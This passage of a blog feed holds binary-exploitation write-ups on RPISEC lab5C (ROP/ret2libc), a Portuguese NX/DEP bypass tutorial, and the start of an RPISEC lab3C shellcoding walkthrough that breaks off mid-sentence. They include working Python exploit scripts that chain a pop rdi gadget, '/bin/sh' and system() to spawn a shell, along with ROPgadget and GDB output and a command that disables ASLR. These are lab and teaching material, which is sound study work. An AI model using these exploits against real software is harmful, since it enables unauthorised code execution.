address of the <code class="language-plaintext highlighter-rouge">system()</code> function, 2 - an argument to system(), 3 - gadgets that put this argument in the right place.</p> <p>First the Gadgets. We need a “pop rdi” so that the system() function argument is passed to the RDI register and then passed to the function.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ROPgadget <span class="nt">--binary</span> lab5C <span class="nt">--ropchain</span> | <span class="nb">grep </span>pop
0x000000000040113b : add byte ptr <span class="o">[</span>rcx], al <span class="p">;</span> pop rbp <span class="p">;</span> ret
0x0000000000401136 : mov byte ptr <span class="o">[</span>rip + 0x2f03], 1 <span class="p">;</span> pop rbp <span class="p">;</span> ret
0x00000000004013ac : pop r12 <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004013ae : pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004013b0 : pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004013b2 : pop r15 <span class="p">;</span> ret
0x00000000004013ab : pop rbp <span class="p">;</span> pop r12 <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004013af : pop rbp <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x000000000040113d : pop rbp <span class="p">;</span> ret
0x00000000004013b3 : pop rdi <span class="p">;</span> ret  &lt;<span class="o">=====</span> this addr
0x00000000004013b1 : pop rsi <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004013ad : pop rsp <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
</code></pre></div></div> <p>Now let’s get the address of the system function:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/systemaddr.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Lastly, the address of the string “/bin/sh” that we will use as an argument for system()</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/binshaddr.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <h3 id="having-all-the-addresses-we-will-put-them-in-the-exploit">Having all the addresses we will put them in the exploit</h3> <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">struct</span>

<span class="n">gadget</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;Q</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x00000000004013b3</span><span class="p">)</span>

<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;Q</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x7ffff7f7f152</span><span class="p">)</span>

<span class="n">sys_addr</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;Q</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x7ffff7e2fe50</span><span class="p">)</span>

<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mi">136</span> <span class="o">+</span> <span class="n">gadget</span> <span class="o">+</span> <span class="n">binsh_addr</span> <span class="o">+</span> <span class="n">sys_addr</span><span class="p">)</span>
</code></pre></div></div> <h3 id="now-lets-run-it-in-gdb-and-see-if-it-works">Now let’s run it in GDB and see if it works.</h3> <p>We can see the “pop rdi” gadget followed by “/bin/sh” and system on the stack:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exprop1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>After pop rdi is executed we see that “/bin/sh” was passed to the register:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exprop2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>And after the system call, GDB finishes executing the binary showing that a process has been started:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exprop3.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>It seems like everything is fine, the exploit worked in the context of GDB, now let’s see outside.</p> <p>note: It is worth remembering that the machine’s ASLR must be disabled otherwise the exploit will not work. To disable it: <code class="language-plaintext highlighter-rouge">$ sudo sysctl kernel.randomize_va_space=0</code></p> <h3 id="pwn">pwn!</h3> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exprop4.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Remembering that the idea of this laboratory was to be done in 32-bit architecture but I decided to do it in 64-bit because it was more current. In 32 bits, it changes the way exploration is done, passing system() function arguments through the stack and not through registers. The rest is basically the same.</p>]]></content><author><name></name></author><category term="rpisec"/><category term="bin-exp"/><summary type="html"><![CDATA[rpisec lab5C]]></summary></entry><entry><title type="html">bypass NX/DEP do CEB(mentebinaria)</title><link href="https://geleiaa.github.io/blog/2024/bypass_NX/" rel="alternate" type="text/html" title="bypass NX/DEP do CEB(mentebinaria)"/><published>2024-01-10T00:00:00+00:00</published><updated>2024-01-10T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2024/bypass_NX</id><content type="html" xml:base="https://geleiaa.github.io/blog/2024/bypass_NX/"><![CDATA[<h3 id="bypass-nxdep">Bypass NX/DEP</h3> <h3 id="esse-texto-reúne-o-que-aprendi-sobre-bypass-de-nx-juntando-as-video-aulas-do-curso-ceb-de-exploração-de-binarios-aula-do-07-a-14-httpswwwyoutubecomplaylistlistplifzmtppyfp4maqhy_ir8um0mjes7p7s3">Esse texto reúne o que aprendi sobre bypass de NX juntando as video aulas do curso CEB de exploração de binarios. Aula do 07 a 14 (https://www.youtube.com/playlist?list=PLIfZMtpPYFP4MaQhy_iR8uM0mJEs7P7s3)</h3> <p>Primeiro vamos a uma breve introdução sobre o NX ou também conhecido como DEP(Data Execution Prevention):</p> <p>O NX/DEP é uma técnica de mitigação de exploração usada para garantir que apenas segmentos de código são sempre marcados como executáveis…</p> <p>Ok, mas como assim somente segmentos de código marcados como executáveis??</p> <p>Bom, vamos lá. Nos writeups anteriores vimos que para explorar os binários, usamos a técnica de Buffer-overflow para sobrescrever um endereço de retorno e, logo depois dessa sobrescrita, jogamos algum shellcode na stack, para assim ganharmos controle sobre o fluxo de execução do binário. Essa exploração só é possível porque o binário em questão foi compilado com a flag <code class="language-plaintext highlighter-rouge">-z execstack</code> que desabilita a proteção NX.</p> <p>Agora com a proteção ativada, as areas da stack e heap NÃO possuem permissão de execução. Sendo assim, não será possível realizar a exploração jogando algum shellcode na stack, porque simplesmente não será executado (e provavelmente resultara em um SEGFAULT).</p> <p>Sabendo disso, vamos para a parte do bypass…</p> <h3 id="bypass">Bypass</h3> <ul> <li>“If you can’t inject (shell)code to do your bidding, you must re-use the existing code!” RPISEC - MBE lecture_07</li> </ul> <p>Se você não pode injetar código… reutilize o código existente.</p> <p>O bypass mais conhecido para o NX é o ROP <code class="language-plaintext highlighter-rouge">(Return Oriented Programming)</code>. ROP é uma técnica para reutilizar código/instruções existentes em um binário para montar algo malicioso. Outros termos conhecidos são <code class="language-plaintext highlighter-rouge">ROPgadgets/Gadgets</code> e <code class="language-plaintext highlighter-rouge">ROPchain</code>.</p> <p>Os <code class="language-plaintext highlighter-rouge">ROPgadgets</code> ou só <code class="language-plaintext highlighter-rouge">Gadgets</code> basicamente são instruções presentes na memória do binário, que não fazem parte da execução da <code class="language-plaintext highlighter-rouge">main</code>, mas podem ser utilizadas porque são parte da execução do binário (e geralemente terminam com uma instrução <code class="language-plaintext highlighter-rouge">RET</code>). Esses gadgets podem ser usados para montar instruções maliciosas semelhante a um shellcode. A junção desses gadgets é chamada de <code class="language-plaintext highlighter-rouge">ROPchain</code>.</p> <h3 id="tudo-bem-ja-sabemos-o-que-é-o-nx-e-qual-tecnica-é-usada-para-bypassa-lo-agora-vamos-para-a-demonstração">Tudo bem, ja sabemos o que é o NX e qual tecnica é usada para “bypassa-lo”. Agora vamos para a demonstração:</h3> <p>A ideia é a seguinte: já que não podemos executar um shellcode através da stack, temos que executar algo parecido, então vamos usar a técnica <code class="language-plaintext highlighter-rouge">ret2libc</code>. Essa técnica consiste em fazer o binário chamar funções da libc usando os endereços de memória carregados pelo próprio binário em tempo de execução.</p> <p>Para o exemplo chamaremos a função <code class="language-plaintext highlighter-rouge">system()</code>, e como a função system() sem argumentos não faz nada, vamos passar pra ela a string <code class="language-plaintext highlighter-rouge">"/bin/sh"</code> . Dessa forma temos algo parecido com um shellcode.</p> <h3 id="step-by-step-da-exploração">Step by step da exploração</h3> <h4 id="1---o-binário-usado-de-exemplo-nas-aulas-era-vulneravel-a-um-bof-então-a-primeira-coisa-a-fazer-é-estourar-o-buffer-e-controlar-algum-endereço-de-retorno">1 - O binário usado de exemplo nas aulas era vulneravel a um B.O.F, então a primeira coisa a fazer é estourar o buffer e controlar algum endereço de retorno.</h4> <h4 id="2---depois-de-explorar-o-bof-precisamos-saber-qual-gadget-pode-ser-usado-de-forma-maliciosa-para-isso-vamos-usar-a-tool-ropgadget-httpsgithubcomjonathansalwanropgadget-">2 - Depois de explorar o B.O.F precisamos saber qual <code class="language-plaintext highlighter-rouge">Gadget</code> pode ser usado de forma maliciosa. Para isso vamos usar a tool ROPgadget (https://github.com/JonathanSalwan/ROPgadget) .</h4> <p>Vamos procurar <code class="language-plaintext highlighter-rouge">gadgets</code> filtrando por <code class="language-plaintext highlighter-rouge">"pop rdi"</code>. Porque os registradores <code class="language-plaintext highlighter-rouge">RDI</code> e <code class="language-plaintext highlighter-rouge">RSI</code> são usados para passagem de argumentos na arquitetura de 64 bits. Para que o argumento “/bin/sh” seja passado para a função system ele precisa estar em algum desses registradores.</p> <p>Rodando a tool e analisando a saida, vemos a instrução que precisamos:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ROPgadget <span class="nt">--binary</span> aula_13 <span class="nt">--ropchain</span> | <span class="nb">grep</span> <span class="s2">"pop"</span>

...

0x00000000004011ab : pop rbp <span class="p">;</span> pop r12 <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004011af : pop rbp <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x0000000000401109 : pop rbp <span class="p">;</span> ret
0x00000000004011b3 : pop rdi <span class="p">;</span> ret 	&lt;<span class="o">======</span> essa aqui
0x00000000004011b1 : pop rsi <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004011ad : pop rsp <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
</code></pre></div></div> <p>Deixe o endereço separado e vamos para o próximo passo.</p> <h4 id="3---agora-precisamos-achar-o-endereço-da-string-binsh-na-memória-a-qual-o-binário-tem-acesso-em-tempo-de-execução">3 - Agora precisamos achar o endereço da string <code class="language-plaintext highlighter-rouge">"/bin/sh"</code> na memória a qual o binário tem acesso em tempo de execução.</h4> <p>Para isso vamos rodar o binário no GDB, setar um breakpoint qualquer e logo depois da execução parar no breakpoint, vamos buscar pela string “/bin/sh” da seguinte forma: <code class="language-plaintext highlighter-rouge">gdb-peda$ find "/bin/sh"</code></p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>find <span class="s2">"/bin/sh"</span>
Searching <span class="k">for</span> <span class="s1">'/bin/sh'</span> <span class="k">in</span>: None ranges
Found 1 results, display max 1 items:
libc : 0x7ffff7f745bd <span class="nt">--</span><span class="o">&gt;</span> 0x68732f6e69622f <span class="o">(</span><span class="s1">'/bin/sh'</span><span class="o">)</span>
</code></pre></div></div> <p>Deixe esse endereço separado também e vamos para o próximo passo.</p> <h4 id="4---a-ultima-das-nossas-buscas-será-pelo-endereço-da-função-system-fazendo-da-mesma-forma-que-o-endereço-de-binsh">4 - A ultima das nossas buscas será pelo endereço da função <code class="language-plaintext highlighter-rouge">system()</code>. Fazendo da mesma forma que o endereço de “/bin/sh”.</h4> <p>Rode o binário no GDB, sete um breakpoint qualquer e logo depois da execução parar no breakpoint, busque pelo endereço da seguinte forma: <code class="language-plaintext highlighter-rouge">gdb-peda$ p system</code></p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>p system
<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>int <span class="o">(</span>const char <span class="k">*</span><span class="o">)}</span> 0x7ffff7e12290 &lt;__libc_system&gt;
</code></pre></div></div> <h4 id="5---depois-de-ter-os-endereços-necessários-vamos-montar-o-script-do-exploit">5 - Depois de ter os endereços necessários vamos montar o script do exploit:</h4> <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">struct</span>

<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">88</span>                              <span class="c1">#JUNK
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;Q</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x4011b3</span><span class="p">)</span>      <span class="c1">#POP RDI; RET;
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;Q</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x7ffff7f745bd</span><span class="p">)</span>    <span class="c1">#POINTER TO "/bin/sh"
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;Q</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x7ffff7e12290</span><span class="p">)</span>    <span class="c1">#SYSTEM ADDR
</span>
<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">exp</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
</code></pre></div></div> <h4 id="6---agora-com-tudo-pronto-vamos-executar-o-exploit-e-ver-como-tudo-funciona">6 - Agora com tudo pronto vamos executar o exploit e ver como tudo funciona:</h4> <ul> <li>RET sobrescrito com o Gadget</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bpnx1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>O “/bin/sh” seguido pela função system na stack</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bpnx2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>“/bin/sh” passado para o registrador RDI</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bpnx3.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>entrando na função system</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bpnx4.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>GDB termina execução e sai startando um novo processo</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bpnx5.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>rodando a exploração fora do GDB</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bpnx6.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div>]]></content><author><name></name></author><category term="bin-exp"/><summary type="html"><![CDATA[binary exploitation]]></summary></entry><entry><title type="html">shellcode lab RPISEC</title><link href="https://geleiaa.github.io/blog/2023/shellcode_lab/" rel="alternate" type="text/html" title="shellcode lab RPISEC"/><published>2023-12-14T00:00:00+00:00</published><updated>2023-12-14T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2023/shellcode_lab</id><content type="html" xml:base="https://geleiaa.github.io/blog/2023/shellcode_lab/"><![CDATA[<h3 id="solving-lab3c--0224---shellcoding-lab-httpsgithubcomrpisecmbeblobmastersrclab03lab3cc">Solving lab3C “| 02/24 | –[ Shellcoding Lab” (https://github.com/RPISEC/MBE/blob/master/src/lab03/lab3C.c)</h3> <h3 id="this-lab-is-a-combination-of-buffer-overflow-and-shellcode-the-intention-os-this-lab-is-explore-bof-and-execute-a-shellcode-and-get-a-shell-on-the-machine-where-the-binary-is-running-this-time-we-will-have-the-shell-part">This lab is a combination of buffer-overflow and shellcode. The intention os this lab is explore bof and execute a shellcode and get a shell on the machine where the binary is running. This time we will have the shell part.</h3> <p>First we go get the source code and compile following the instruction that is commented in the code:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -z execstack -fno-stack-protector lab3C.c -o lab3C
</code></pre></div></div> <p>Running the binary we see that it asks for a username. And when I try to enter any username, I get “incorrect username”:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/runbin.png" class="img-fluid rounded z-depth-1" width="300" height="300" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Looking at the binary strings we see something interesting:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ strings lab3C
</code></pre></div></div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/binstrings.png" class="img-fluid rounded z-depth-1" width="300" height="300" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>We see that the binary also asks for a password and probably this password and the username appear right above.</p> <p>We can also see a preview of the functions that binary uses:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/binstrings2.png" class="img-fluid rounded z-depth-1" width="100" height="100" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Testing the username and password I get a slightly strange result…</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/testuserpass.png" class="img-fluid rounded z-depth-1" width="300" height="300" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>It seems that the username is correct but the password is not, or could it be that the binary doesn’t do anything at all?</p> <h3 id="after-trying-to-understand-what-the-binary-does-now-lets-move-on-to-debugging">After trying to understand what the binary does, now let’s move on to debugging</h3> <p>First, let’s take a look at the disassembly of the main function:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>disas main
Dump of assembler code <span class="k">for function </span>main:
   0x0000000000001201 &lt;+0&gt;:	endbr64 
   0x0000000000001205 &lt;+4&gt;:	push   rbp
   0x0000000000001206 &lt;+5&gt;:	mov    rbp,rsp
   0x0000000000001209 &lt;+8&gt;:	sub    rsp,0x50
   0x000000000000120d &lt;+12&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x50],0x0
   0x0000000000001215 &lt;+20&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x48],0x0
   0x000000000000121d &lt;+28&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x40],0x0
   0x0000000000001225 &lt;+36&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x38],0x0
   0x000000000000122d &lt;+44&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x30],0x0
   0x0000000000001235 &lt;+52&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x28],0x0
   0x000000000000123d &lt;+60&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x20],0x0
   0x0000000000001245 &lt;+68&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x18],0x0
   0x000000000000124d &lt;+76&gt;:	mov    DWORD PTR <span class="o">[</span>rbp-0x4],0x0
   0x0000000000001254 &lt;+83&gt;:	lea    rdi,[rip+0xdd5]        <span class="c"># 0x2030</span>
   0x000000000000125b &lt;+90&gt;:	call   0x1090 &lt;puts@plt&gt;
   0x0000000000001260 &lt;+95&gt;:	lea    rdi,[rip+0xdf0]        <span class="c"># 0x2057</span>
   0x0000000000001267 &lt;+102&gt;:	mov    eax,0x0
   0x000000000000126c &lt;+107&gt;:	call   0x10a0 &lt;<span class="nb">printf</span>@plt&gt;
   0x0000000000001271 &lt;+112&gt;:	mov    rax,QWORD PTR <span class="o">[</span>rip+0x2da8]        <span class="c"># 0x4020 &lt;stdin@@GLIBC_2.2.5&gt;</span>
   0x0000000000001278 &lt;+119&gt;:	mov    rdx,rax
   0x000000000000127b &lt;+122&gt;:	mov    esi,0x100
   0x0000000000001280 &lt;+127&gt;:	lea    rdi,[rip+0x2db9]        <span class="c"># 0x4040 &lt;a_user_name&gt;</span>
   0x0000000000001287 &lt;+134&gt;:	call   0x10b0 &lt;fgets@plt&gt;
   0x000000000000128c &lt;+139&gt;:	mov    eax,0x0
   0x0000000000001291 &lt;+144&gt;:	call   0x11a9 &lt;verify_user_name&gt;
   0x0000000000001296 &lt;+149&gt;:	mov    DWORD PTR <span class="o">[</span>rbp-0x4],eax
   0x0000000000001299 &lt;+152&gt;:	cmp    DWORD PTR <span class="o">[</span>rbp-0x4],0x0
   0x000000000000129d &lt;+156&gt;:	je     0x12b2 &lt;main+177&gt;
   0x000000000000129f &lt;+158&gt;:	lea    rdi,[rip+0xdc2]        <span class="c"># 0x2068</span>
   0x00000000000012a6 &lt;+165&gt;:	call   0x1090 &lt;puts@plt&gt;
   0x00000000000012ab &lt;+170&gt;:	mov    eax,0x1
   0x00000000000012b0 &lt;+175&gt;:	jmp    0x1309 &lt;main+264&gt;
   0x00000000000012b2 &lt;+177&gt;:	lea    rdi,[rip+0xdcc]        <span class="c"># 0x2085</span>
   0x00000000000012b9 &lt;+184&gt;:	call   0x1090 &lt;puts@plt&gt;
   0x00000000000012be &lt;+189&gt;:	mov    rdx,QWORD PTR <span class="o">[</span>rip+0x2d5b]        <span class="c"># 0x4020 &lt;stdin@@GLIBC_2.2.5&gt;</span>
   0x00000000000012c5 &lt;+196&gt;:	lea    rax,[rbp-0x50]
   0x00000000000012c9 &lt;+200&gt;:	mov    esi,0x64
   0x00000000000012ce &lt;+205&gt;:	mov    rdi,rax
   0x00000000000012d1 &lt;+208&gt;:	call   0x10b0 &lt;fgets@plt&gt;
   0x00000000000012d6 &lt;+213&gt;:	lea    rax,[rbp-0x50]
   0x00000000000012da &lt;+217&gt;:	mov    rdi,rax
   0x00000000000012dd &lt;+220&gt;:	call   0x11d7 &lt;verify_user_pass&gt;
   0x00000000000012e2 &lt;+225&gt;:	mov    DWORD PTR <span class="o">[</span>rbp-0x4],eax
   0x00000000000012e5 &lt;+228&gt;:	cmp    DWORD PTR <span class="o">[</span>rbp-0x4],0x0
   0x00000000000012e9 &lt;+232&gt;:	je     0x12f1 &lt;main+240&gt;
   0x00000000000012eb &lt;+234&gt;:	cmp    DWORD PTR <span class="o">[</span>rbp-0x4],0x0
   0x00000000000012ef &lt;+238&gt;:	je     0x1304 &lt;main+259&gt;
   0x00000000000012f1 &lt;+240&gt;:	lea    rdi,[rip+0xd9e]        <span class="c"># 0x2096</span>
   0x00000000000012f8 &lt;+247&gt;:	call   0x1090 &lt;puts@plt&gt;
   0x00000000000012fd &lt;+252&gt;:	mov    eax,0x1
   0x0000000000001302 &lt;+257&gt;:	jmp    0x1309 &lt;main+264&gt;
   0x0000000000001304 &lt;+259&gt;:	mov    eax,0x0
   0x0000000000001309 &lt;+264&gt;:	leave  
   0x000000000000130a &lt;+265&gt;:	ret    
End of assembler dump.
</code></pre></div></div> <p>Analyzing we can see that in main there are two more functions: <strong>verify_user_name</strong> and <strong>verify_user_pass</strong>. These are probably the functions that check the name and password input.</p> <p>And just before calling the function <strong>verify_user_name</strong> we can see that the username variable is referenced before calling a <strong>fgets</strong> which can take the name and store it in the variable. Now the function <strong>verify_user_pass</strong> does not have the password variable referenced before being called. This may mean that inputs are stored in different ways…</p> <p>Looking at the disassembly of functions, we don’t see much that is useful:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/disasfuncs.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>We see that the functions probably take the input and do a comparison using the <strong>strncmp</strong> function. If we consider what we saw in the strings, these functions must compare the inputs with the values ​​”rpisec” and “admin”.</p> <h3 id="now-that-we-know-what-the-binary-does-we-can-do-some-tests-to-find-the-best-path-to-shellcode-which-is-the-idea-of-this-lab">Now that we know what the binary does, we can do some tests to find the best path to shellcode, which is the idea of ​​this lab.</h3> <p>Following with what we already know, we first have to test whether any variable can be overflowed. Putting breakpoints in the verification functions right after the input goes to the binary and put a pattern on the inputs for see how it is handled.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/breakfuncs.png" class="img-fluid rounded z-depth-1" width="300" height="300" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Let’s use the alphabet pattern like in the previous lab, so we know when there was a memory leak:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ
</code></pre></div></div> <p>After a few steps in <strong>verify_user_name</strong> we stop at the <strong>strcmp</strong> function call and see the comparison with the string “rpisec”. And we can also notice that one of <strong>strcmp</strong> arguments is “6”, which would be the number of bytes that the function will validate.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/verfname1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>So the first 6 bytes of the input have to be “rpisec”. This can be confirmed because after we go through <strong>strncmp</strong> the flow jumps to a comparison and then print “incorrect username”.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/incorrname.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Then the execution is finished.</p> <h3 id="passing-verify_user_name">Passing verify_user_name</h3> <p>So if we put the string “rpisec” before the pattern we see that <strong>strncpm</strong> only reads the first 6 bytes and with this it is possible to pass the username check.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/passverifname.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>After passing the username verification we arrive at the <strong>verify_user_pass</strong> function. And we can see the password verification being done:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/verifpass1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>As expected, after passing <strong>strncmp</strong> the flow jumps to a comparison and then to the end, but…</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/incorrpass.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>I noticed 